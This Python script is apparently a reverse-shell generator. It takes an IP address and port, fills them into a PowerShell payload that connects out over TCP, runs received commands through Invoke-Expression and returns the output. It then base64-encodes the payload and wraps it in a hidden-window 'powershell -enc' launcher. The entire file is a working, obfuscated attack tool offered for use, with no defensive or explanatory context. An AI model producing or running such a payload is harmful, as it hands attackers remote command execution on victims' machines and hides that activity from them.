import sys
import base64
import colorama

colorama.init()

payload_tcp = """While($True){\nTry{$client = New-Object System.Net.Sockets.TcpClient;\n$client.Connect("<ip>", <port>);\n$stream = $client.GetStream();\nWhile ($True) {;\n$buffer = New-Object System.Byte[] 4024;\n$read = $stream.Read($buffer, 0, 4024);\n$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);\n$Output = Invoke-Expression $msg 2>&1 | Out-String;\n$message = [System.Text.Encoding]::ASCII.GetBytes($Output);\n$stream.Write($message, 0, $message.Length);\n}\n} catch {\n}\n}"""
code = """Start-Process powershell.exe {powershell.exe -enc <payload_tcp> } -WindowStyle hidden"""

if len(sys.argv) != 3:
    print("error no argv")
    sys.exit(1)

ip_address = sys.argv[1]
port = sys.argv[2]

def encrypt_string(text):
    utf16le_bytes = text.encode('utf-16le')

    base64_encoded = base64.b64encode(utf16le_bytes).decode('utf-8')

    return base64_encoded

print(f"{colorama.Fore.LIGHTBLUE_EX}{code.replace('<payload_tcp>', encrypt_string(payload_tcp.replace('<ip>', ip_address).replace('<port>', port)))}")
